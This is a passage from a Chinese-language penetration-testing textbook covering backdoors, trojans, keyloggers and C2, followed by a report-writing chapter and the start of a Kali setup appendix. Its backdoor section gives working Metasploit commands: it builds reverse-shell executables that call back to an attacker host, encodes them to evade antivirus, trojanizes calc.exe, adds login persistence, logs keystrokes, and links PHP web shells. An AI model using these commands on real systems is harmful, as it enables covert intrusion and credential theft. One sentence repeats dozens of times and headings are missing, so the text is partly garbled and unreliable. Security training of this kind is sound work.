  \ 和 Mutillidae 来磨练技能集。\n\n# 第 10 章\n\n# 维持访问\n\n本章将介绍黑客方法的第四步：维持对受破坏系统的访问。这包括通过利用计算机系统和\
  \ Web 服务获取预有的会话，以便反复访问并进一步利用计算机系统及其附属的网络基础设施。\n\n### 关键词\n\n维持访问；后渗透；漏洞；病毒；木马；后门；恶意软件；键盘记录器；托管；间谍；编码；负载；僵尸网络；脚本；命令与控制\n\
  \n## 本章内容\n\n![ent](img/FilledVerySmallSquare_9642.gif) 维持访问：术语与核心概念\n\n![ent](img/FilledVerySmallSquare_9642.gif)\
  \ 后门\n\n![ent](img/FilledVerySmallSquare_9642.gif) 键盘记录器\n\n## 章节概述与核心学习点\n\n本章将解释与在受破坏系统中维持访问相关的后渗透操作。核心学习点包括：\n\
  \n- 恶意软件\n- 后门\n- 特洛马\n- 病毒\n- 蠕虫\n- 键盘记录器\n- 僵尸网络\n- 托管与远程通信服务\n- 命令与控制系统\n\n###\
  \ 引言\n\n利用计算机、网络设备或 Web 服务是很棒；然而，大多数渗透测试的目标是维持对受破坏系统的访问。维持受利用受害者系统访问的方法有很多，但每种方法的最终结论都不是窃取信息，而是为了减少在系统已被破坏后反复攻击同一台机器所需的耗时精力和详尽工作。如果安全测试人员与团队合作、使用远程托管服务器，或者需要次要访问点以便以后访问计算机系统，那么就可以很容易管理工作和预期，并且攻击可以更加精确。\n\
  \n维持访问是一种次要艺术形式，涉及的思考与利用系统一样多，甚至更多。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了基本概念。\n\
  \n## 术语与核心概念\n\n本章涵盖了安全测试人员和黑客都用于维持访问的基本概念。本章涵盖了基本概念。\n\n### 恶意软件\n\n恶意软件（Malware）是病毒、木马、键盘记录器和僵尸网络的统称。在渗透测试中，使用恶意软件对于执行层报告是好的，但在涉及技术报告时。\n\
  \n### 后门\n\n不要与木马混淆，后门是留在受破坏系统中以便以后使用的程序。虽然大多数木马都包含后门，但后门并不一定是木马的一部分。后门是像木马一样运行的应用程序或脚本，但不提供任何用户功能。\n\
  \n### 特洛马\n\n特洛马（Trojan horse）通常称为“Trojan”，是一种安装在主机上的恶意程序，它执行期望的或公开的功能，但在其代码中隐藏并执行隐蔽程序，以创建后门，并在某些情况下通过社交工程诱导未经训练的人员泄露个人信息（如信用卡号）。由于今天木马的本质，“木马”一词通常与后门同义。此外，木马经常与病毒混淆。木马与分类为病毒的区别在于，木马通常是一个独立的程序，不会注入到另一个程序中。\n\
  \n\n\n\n\n与病毒类似，蠕虫也具有同样的破坏力。蠕虫与病毒的区别在于，蠕虫不需要人类交互即可进行复制。蠕虫针对漏洞，然后执行命令从当前主机移动到另一个系统，并自动感染其他有漏洞的系统。由于蠕虫一旦脱离安全测试人员的控制将具有极大的不可性和风险，因此蠕虫通常不用于渗透测试。所有涉及蠕虫的技术和分析工作都应该在绝对无法访问相邻网络（尤其是互联网）的实验室环境中进行。\n\
  \n## 键盘记录器 (Keyloggers)\n\n顾其实名，键盘记录器捕获用户的击键并将这些信息回传给安全测试人员。关于创建、使用和检测键盘记录器的广泛方法论，已经有了大量的文档和书籍。键盘记录器是渗透测试人员必不可少的工具，并且在任务执行中经常使用。然而，使用键盘记录器可能会违反某些希望保护员工隐私公司的运营规则（ROE），因为键盘记录器会捕获有关个人身份验证机制的信息，例如私密电子邮件和银行信息。在进行渗透测试时，务必向客户确认授权使用键盘记录器。如果获得批准，键盘记录器的使用应在\
  \ ROE 中详细记录。键盘记录器捕获的所有信息都应在严格监督下保存，并在任务结束后销毁。\n\n本章稍后将介绍各种类型的键盘记录器。\n\n## 僵尸网络 (Botnets)\n\
  \nBot 是机器人的缩写，有时被称为僵尸（zombies），是由单个攻击者（通常称为僵尸主 bot master）控制的计算机网络。感染了病毒、木马和后门的系统可以成为僵尸网络的一部分。僵尸主（攻击者）控制一个主服务器，主服务器反控制不同位置的其他命令与控制系统，再由这些系统将命令传递给单个僵尸。僵尸网络的常见用途包括\
  \ DoS、DDoS、垃圾服务、对身份验证控制和密码进行分布式暴力破解，以及其他窃取信息或对受害者进行社交工程攻击的服务。僵尸网络可以很小，仅包含几台受感染的机器，也可以很大，包括数千台机器、多个服务器甚至多个僵尸主。\n\
  \n## 托管 (Colocation)\n\n“托管”是异地托管服务的专业术语。攻击者可以向提供完全匿名服务的企业支付托管费用，价格从每月几美元到每年几千美元不等。托管并不一定由第三方提供，服务可以来自受损的系统，或者包含多个能够利用系统资源的受感染网络。不需要使用第三方托管服务的僵尸网络示例是垃圾邮件僵尸网络。托管服务器甚至可以由为客户提供渗透测试的公司自行托管。\n\
  \n## 远程通信 (Remote Communications)\n\n本书中的“远程通信”涵盖了如 VPN、点对点隧道协议、远程桌面以及主机与不在同一局域网的服务器之间的任何形式的通信。安全测试人员需要建立远程通信，以便与客户端受损主机上的漏洞会话、后门、命令与控制系统或隧道。可以利用隐蔽通道和加密来规避服务，例如入侵检测系统（IDS），这些系统会警示管理员注意它们的存在。加密通信不在本书的讨论范围内。\n\
  \n## 命令与控制 (Command and Control)\n\n命令与控制（C2）系统用于管理来自受损主机的远程会话。通过命令与控制程序界面，安全测试人员可以直接从程序发送命令或访问远程\
  \ shell。在渗透测试期间，安全测试人员可以在受损主机上部署远程访问终端（RAT），让其拨回命令与控制服务器。在本章稍后的部分中，将讨论一种名为 `Poison\
  \ Ivy` 的流行命令与控制系统作为实操演示。\n\n本书的作者和出版者必须强调玩弄病毒制作包（virus making kits）的危险性。虽然有很多系统可以即时创建病毒，但这是一个极其先进的主题，可能会很快失控。如果不了解此类类型系统的每个功能和部分，可能会导致病毒在野外扩散并在互联网上肆意运行。其法律后果严重，受当地、州、联邦和国际法律的制裁。例如，2000\
  \ 年的“ILoveYou”病毒本应只访问一个（1）人的电子邮件然后停止。据估计，它造成的损失达十亿美元 [[1]](#CHP010.html_BIB1)。\n\
  \n为本书汇集的研究发现，几乎所有免费获取并广泛使用的病毒、木马和后门生成器都感染了独立的病毒，而这些病毒并非预期应用程序或程序包的一部分。使用此类代码生成器极有可能感染或破坏你的计算机、网络或相邻网络。本书的作者、出版者及关联机构不承担任何责任。\n\
  \n## 后门 (Backdoors)\n\n后门是必要的工具；因此，渗透测试人员需要能够生成、上传和执行后门程序。后门并不隐藏在木马等功能程序内部，但如前所述，许多木马包含后门。接下来的章节将展示如何创建后门以及木马，以进一步巩固两者之间的区别和相似之处。强烈鼓励读者在\
  \ Kali Linux 操作系统中打开终端窗口进行同步操作。为了成功完成此练习，应创建一个名为“backdoors”的目录。\n\n```bash\nmkdir\
  \ backdoors\n```\n\n### 使用 Metasploit 的后门\n\nMetasploit GUI 功能强大；然而，Metasploit 在命令行下的完整功能更为令人深刻。`msfpayload`\
  \ 命令可以从命令行生成二进制文件，这些文件可用于各种 Microsoft 和 Linux 平台以及 Web 应用程序。此外，`msfpayload` 可以通过\
  \ `msfencode` 工具进行加密，以避免杀毒软件检测。\n\n#### 从负载创建可执行二进制文件（未加密）\n\n`msfpayload` 工具与 Metasploit\
  \ 中列出的任何负载配合使用。要查看可用负载列表，请在命令行使用 `msfpayload -l`。以下步骤将使用 `windows/meterpreter/reverse_https`\
  \ 负载。图 10.1 显示了 `msfpayload {payload_name} S` 命令的输出。这将向渗透测试人员显示在转换为可执行二进制文件时需要设置的字段。\n\
  \n![image](img/F000100f10-01-9780124077492.jpg)\n\n图 10.1 `msfpayload` 输出\n\n`msfpayload`\
  \ 工具可以将负载导出为以下格式：\n\n* [C] C\n* [H] C-sharp\n* [P] Perl\n* [Y] Ruby\n* [R] Raw\n\
  * [J] Javascript\n* [X] Executable\n* [D] 动态链接库 (DLL)\n* [V] VBA\n* [W] War\n* [N]\
  \ Python\n\n拥有所有信息后，测试人员可以使用以下命令创建可执行二进制文件。注意，这是一条命令，应在行内输入。\n\n```bash\nmsfpayload\
  \ windows/meterpreter/reverse_tcp LHOST={YOUR_IP} LPORT={PORT} X > /root/backdoors/unencoded-payload.exe\n\
  ```\n\n图 10.2 显示了创建 unencoded-payload.exe 后门的输出。\n\n![image](img/F000100f10-02-9780124077492.jpg)\n\
  \n\n\n\n\n图 10.2 从载荷创建可执行二进制文件。\n\n## 从载荷创建可执行二进制文件（编码）\n\n### `msfencode` 工具\n\n\
  ```\nmsfpayload windows/meterpreter/reverse_tcp LHOST={YOUR_IP} LPORT={PORT} R |\
  \ msfencode -e x86/countdown -c 2 -t raw | msfencode –x -t exe -e x86/shikata_ga_nai\
  \ -c 3 -k -o /root/backdoors/encoded-payload.exe\n```\n\n图 10.3 显示了创建 `encoded-payload.exe`\
  \ 后门后的输出。\n\n![image](img/F000100f10-03-9780124077492.jpg)\n\n图 10.3 从编码后的载荷创建可执行二进制文件。\n\
  \n### 创建编码木木马\n\n前几节中的后门完全在后台运行，不会与当时登录系统的用户交互。木木马看起来像是一个用户可能会使用的功能性程序。本指南基于 Microsoft\
  \ Windows XP Service Pack 3 平台的 `calc.exe`（*计算器*）应用程序创建。为了此练习正常运行，必须将 `calc.exe`\
  \ 复制到外部 U 盘。\n\nWindows 平台上的所有二进制文件都能受到木马化。例如，如果使用的是 Windows 7 Ultimate 平台的 `calc.exe`\
  \ ，这种攻击甚至无法执行。其他考虑因素包括使用的编码数量、活动防火墙、入侵检测系统和加密系统。并非可执行文件都能运行；可执行文件的木马化是一个尝试错误的过程，最适合在实验室进行。\n\
  \n```\nmsfpayload windows/meterpreter/reverse_tcp {YOUR_IP} {PORT} R | msfencode\
  \ -e x86/countdown -c 2 -t raw | msfencode -x /media/{EXTERNAL_USB_DRIVE}/calc.exe\
  \ -t exe -e x86/shikata_ga_nai -c 3 -k -o /root/backdoors/trojan-calc.exe\n```\n\
  \n图 10.4 显示了从 Windows `calc.exe` 二进制文件创建 `trojan-cmd-payload.exe` 木马的输出。\n\n![image](img/F000100f10-04-9780124077492.jpg)\n\
  \n图 10.4 为 Microsoft Windows 创建的可执行木马。\n\n从 Windows 二进制文件 `calc.exe` 创建的木马可以通过书中所述的多种方式上传给受害者。\n\
  \n### 设置 Metasploit 监听器\n\n创建的后门和木马是客户端攻击，并会回家获取进一步指令。渗透测试人员需要在 Metasploit 中设置监听器来响应调用。Metasploit\
  \ 的 `multi-handler` 是一个美化的接听服务，供木马或后门回家并接收进一步指令。\n\n1. `msfconsole`\n2. `use exploit/multi/handler`\n\
  3. `set PAYLOAD windows/meterpreter/reverse_tcp`\n4. `set LHOST {YOUR_IP}`\n5. `set\
  \ LPORT {PORT}`\n6. `run`\n\n图 10.5 显示了在 Metasploit 上设置监听器以及后门的回调。连接是从受害操作系统建立的，执行了\
  \ `unencoded-payload.exe` 应用程序。\n\n![image](img/F000100f10-05-9780124077492.jpg)\n\
  \n图 10.5 Metasploit multi-handler 监听。\n\n### 持久化后门\n\n就像大学生回家查看父母并要钱的想法一样，后门或木马也需要遵循相同的基本流程。与大学生不同，使用\
  \ meterpreter shell 中的 `scheduleme` 任务实现这一点更容易。`scheduleme` 工具可以根据时间增量（*例如，每周或每\
  \ 20 分钟一次*）或根据某些机器或用户操作（如启动或用户登录计算机）来启动命令。\n\n```\nscheduleme -c {“file/command”}\
  \ -i -l\n```\n\n图 10.6 显示了一个计划，每当用户登录系统时都会启动 `unencoded-payload.exe` 应用程序。它将尝试执行一次命令，但会在登录过程后立即运行。这将确保应用程序定期回家。\n\
  \n![image](img/F000100f10-06-9780124077492.jpg)\n\n图 10.6 Scheduleme。\n\n### 可检测性\n\
  \n如果测试人员知道潜在目标系统上运行着什么种杀毒软件，或者想要测试编码过程的强度，可以将文件（*又名后门和木马*）上传到 [`www.virustotal.com/`](http://www.virustotal.com/)。图\
  \ 10.7 显示了常见杀毒软件厂商对 `trojan-calc.exe` 文件的检测能力。\n\n![image](img/F000100f10-07-9780124077492.jpg)\n\
  \n图 10.7 [VirusTotal.com](http://VirusTotal.com)。\n\n### Web 服务后门\n\n允许渗透测试人员上传内容的漏洞\
  \ Web 服务面临通过 Web 服务后门的可能性。这些后门作为额外页面发布在网站上，任何能够找到该网页的人都可以使用。以下是可以上传到 Web 服务器并用于在受害者上执行本地命令或与服务器通信的数据库交互的后门短列表。\n\
  \n1. `C99 Shell`—PHP 后门 Shell 下载：[`www.r57shell.net/`](http://www.r57shell.net/)\n\
  2. `C100 Shell`—PHP 后门 Shell 下载：[`www.r57shell.net/`](http://www.r57shell.net/)\n\
  3. `Jackall`—PHP 后门 Shell 下载：[`oco.cc`](http://oco.cc)\n4. `XXS-Shell`—ASP.net 后门和僵尸控制器：[`www.portcullis-security.com/tools/free/XSSShell039.zip`](http://www.portcullis-security.com/tools/free/XSSShell039.zip)\n\
  5. `Weevley`—提供类似 telnet 控制台的 PHP 后门：[`epinna.github.com/Weevley/downloads/weevley-1.0.tar.zip`](http://epinna.github.com/Weevley/downloads/weevley-1.0.tar.zip)\n\
  \n## 键盘记录\n\n键盘记录是捕捉登录系统的用户或管理员击键的过程。有许多第三方应用程序声称可以在不被检测的情况下安装并运行。虽然大多数这些说法在某种程度上是真实的，但安装和使用键盘记录程序通常需要操作系统或物理连接监听设备。第三方的说法还没有考虑测试人员尝试使用的系统上运行的杀毒程序或入侵检测系统。Metasploit\
  \ 在 meterpreter shell 中有一个名为 `keyscan` 的内置工具。如果渗透测试人员与受害者建立了会话，命令非常直观。\n\n1. `keyscan_start`\n\
  2a. `keyscan_dump`\n2n. `keyscan_dump`（根据需要重复）\n3. `keyscan_stop`\n\n图 10.8 显示了\
  \ metasploit 内建立会话的键盘记录捕捉。执行了 `keyscan` 服务以显示所有击键，但可以通过向 `keyscan` 工具传递应用程序的 PID\
  \ 来锁定特定应用程序。可以在附加会话时从 meterpreter 命令行通过 `ps` 命令找到 PID。\n\n![image](img/F000100f10-08-9780124077492.jpg)\n\
  \n图 10.8 Keyscan。\n\n## 总结\n\n本章介绍了维持访问的运用；这只是恶意软件宇宙这一广阔主题中的一粒尘埃。读者现在为进一步研究恶意软件领域以及高级渗透测试相关的安全实践奠定了基础。制作恶意软件可以引导研究人员进入互联网最黑暗的角落，也可以为安全从业人员带来启示，以进一步增强全球计算机系统的安全性。\n\
  \n\n\n\n本章描述了渗透测试报告的组成部分，并包含了关于每个章节应包含的信息。\n\n### 关键词\n报告；执行摘要；演示\n\n## 本章包含的信息\n\
  \n![ent](img/FilledVerySmallSquare_9642.gif) 本章中的信息将协助道德黑客完成渗透测试报告，这些报告用于向组织管理层和技术人员展示渗透测试的技术发现。\n\
  \n## 章节概述与核心学习要点\n\n本章将：\n– 解释渗透测试报告的组成部分\n– 定义交付选项\n– 描述测试数据和报告数据的保留可能性\n\n## 报告\n\
  \n在进行渗透测试时，技术专业知识至关重要，这是获得所需结果以验证受评估系统安全状态的唯一途径。组织管理层通常是授权进行渗透测试的群体，更重要的是支付费用给渗透测试团队进行评估。这同一管理团队会希望看到一份针对其感兴趣信息的报告。与此同时，系统开发和管理团队的技术专家则需要发现的细节细节来做出必要的修正。因此，测试报告通常分为几个章节，本章将对其进行描述。\n\
  \n### 执行摘要\n\n执行摘要突出了测试事件，并提供了评估概述。这包括测试事件的位置（是本地还是远程）、测试团队的组成，以及对系统安全/漏洞的高级解释。这里是放置图形和饼图的好地方，用以展示所执行漏洞的严重程度。该章节长度不应超过三段，尽管它的位置位于文档开头，但通常是报告中最后编写的部分。\n\
  \n### 任务程序\n\n本节应定义任务的范围和流程。这些包括定义实施了哪些类型的测试。社会工程学是否是评估的一部分？拒绝服务（DoS）攻击呢？评估方法论应在本节中进行全面解释。这包括关于每种攻击实施地点以及目标相对于该位置的详细信息。例如，渗透测试人员可能从远程位置对互联网上的网络应用程序进行特定测试，也可能在目标公司总部外进行无线攻击。\n\
  \n### 目标架构与组成\n\n此可选章节将描述收集有关目标环境的信息，包括操作系统、提供的服务、开放端口以及任何可识别的硬件平台。这里是插入渗透测试期间开发的网络拓扑图的地方。\n\
  \n### 发现\n\n本节描述了在渗透测试期间发现的安全漏洞和弱点。识别出存在特定弱点的每个系统非常重要，以确保系统人员拥有修正已发现弱点所需的信息。如果可能，应将安全弱点与法规或治理要求相关联，以便系统所有者将成本追溯到特定的资金来源。这一步骤帮助系统所有者找到进行系统修正所需的资金。例如，某些需求来源包括《联邦信息安全管理法》（FISMA）、支付卡行业（PCI）标准或萨班斯-奥克斯利法（SOX）。\n\
  \n### 建议措施\n\n本节为发现的每个弱点或漏洞定义了建议措施。这可以独立成章，也可以在“发现”章节中的每个弱点后跟一个关于如何修复该弱点的建议。修正不应定义精确的技术修复，而应以通用的方式处理发现的问题，允许系统所有者和人员自行制定修正方案。例如，对于发现的缺失或默认密码，建议实施并执行强密码策略。\n\
  \n### 结论\n\n结论应该用一系列简短的陈述总结发现的结果和建议措施。这里也可以是重新强调值得额外关注的重要或关键发现的好地方，促使系统所有者优先修正这些项目。\n\
  \n### 附录\n\n附录应涵盖支持报告所需信息，但不应包含在正文中。这包括原始测试数据、关于渗透测试公司的信息、定义、术语表、缩写列表以及个人渗透测试人员的职业简历。\n\
  \n## 演示\n\n大多数商业高管会希望通过正式或半正式的演示来简报渗透测试结果。这还可能包括随演讲者简报的演示幻灯片。无论何种情况，如果需要外部简报，应以尽可能专业的方式进行。避免攻击系统管理、工程、维护和项目管理人员，因为他们通常是决定选择谁进行后续或重复性测试的人员。相反，应以不带感情的方式陈述事实，且不指责任何特定群体。诚实地定义系统的缺点并说明修复这些问题的必要性。\n\
  \n其他时候不需要演示，管理层只需希望将报告交付给特定个人或群体。在这种情况下，确保报告正确、打印完整，并以专业的方式提交给管理层。许多时候，会要求多份报告，包括纸质版外的数字或电子副本。在这些情况下，每份报告应根据打印总数进行编号和跟踪。例如，第一份副本的每一页上都会打印\
  \ `copy 1 of 5`。这提供了一种跟踪这些文档的方法。完成的渗透测试报告包含大量信息，如果落入错误之手，会对组织产生极大破坏。因此，必须对报告的每份副本（物理和电子）进行积极的问责。\n\
  \n## 报告与证据存储\n\n某些组织希望渗透测试组织保留测试结果和报告的电子副本。如果这样做，必须对这些文档的安全性采取特别措施。至少它们应该使用强加密进行保护，并且通常会将这些文档离线加密并存储在安全位置以增加保护措施。\n\
  \n其他客户会要求删除报告和发现。这应该在遵循法律建议的情况下进行，因为根据渗透测试报告未涵盖的错误或遗漏，渗透测试团队可能会后果。如果法律顾问建议可以删除数据，请确保对报告磁盘进行高强度覆盖，并确保所有备份副本和工作成果都得到同样程度的清理。\n\
  \n\n\n对系统进行渗透测试是一件令人兴奋的事，它可以引导系统所有者生产质量质量、更安全的系统。确保活动产生的报告和支持文档传递给正确的人，并以客户要求的方式进行呈现至关重要。最终结果应该是一个报告，指出在评估系统中发现的漏洞，且其评估方式有助于纠正系统，从而使系统乃至整个组织变得更加安全。\n\
  \n# 附录 A\n## Tribal Chicken\n\n## Kali Linux 1.0.5 综合安装与配置指南\n\n![image](img/F000203bm01-9780124077492.jpg)\n\
  \nTribal Chicken\n\n### 引言\n这是一个旨在设置 Tribal Chicken 软件环境的引导教程。Tribal Chicken 用于建立安全测试人员的操作系统基准，并制作便携式\
  \ DVD 或蓝光光盘，光盘可以作为现场操作系统或安装到其他计算机上。每位渗透测试人员和或测试团队都拥有一个根据自己喜好定制的独特操作系统。Tribal Chicken\
  \ 以 `Kali` 或 `Backtrack` 等基础操作系统为基础，创建一个用于快速部署用于渗透测试和实操训练的定制发行版的系统。定制程度可以仅是是对操作系统的更新，也可以深入到对系统的每一个角落和字节进行完全定制。\n\
  \n参与这个项目吧！查看并帮助开发 Tribal Chicken。\n\n网站：[`code.googlecode.com/p/tribal-chicken`](http://code.googlecode.com/p/tribal-chicken)\n\
  \n#### 材料列表\n1. 一台物理计算机或虚拟化软件，如 `VMWare Player` 或 `VirtualBox`。\n2. 至少 80GB 的硬盘空间，推荐\
  \ 160GB。\n   a. 对于本指南，硬盘被安装为主硬盘（`/dev/sda`）。\n3. `Ubuntu 12.10` (64 位) 或更高版本的 DVD。\n\
  \   a. 注意：本指南是使用 `Ubuntu 12.10` (64 位) 生成。使用 32 位软件不在本文档的范围之内，但遵循完全相同的步骤。不同操作系统之间的包版本和命令语法可能存在细微差异，但\
  \ Tribal Chicken 的步骤是相同的。\n4. `Kali Linux` 版本 `1.0.5` (64 位) 或更高版本的 DVD。\n5. 接入互联网的活跃网络连接。\n\
  \   a. 如果网络上没有 `DHCP` 服务，假设读者知道如何配置网络接口设备。如果没有妥善设置基本网络服务并拥有活跃的互联网连接，读者将无法完成本指南。\n\
  6. 熟悉 Linux 命令行界面。\n   a. 本指南中包含的许多命令将在 Linux shell 环境中运行。完成本指南需要导航、管理和文件执行的基础级知识。\n\
  \n### 安装并配置 Ubuntu\n\n#### 1. 安装 Ubuntu 12.10 (64 位)\na. 将 `Ubuntu 12.10` 介质放入适当的驱动器并从磁盘启动。\n\
  b. 点击 > `Install Ubuntu`（安装 Ubuntu）\nc. (*如果此时可用网络*), 勾选“在安装时下载更新”\nd. 点击 > `Continue`（继续）\n\
  e. 选择 > “Something Else”（其他选项）\nf. 点击 > `Continue`（继续）\ng. 在 `/dev/sda` 上设置分区\n\
  \   g.i. 选择 `/dev/sda`。\n   g.ii. 点击 > `New Partition Table`（新建分区表）\n   g.iii. 将出现一个通用警告。点击\
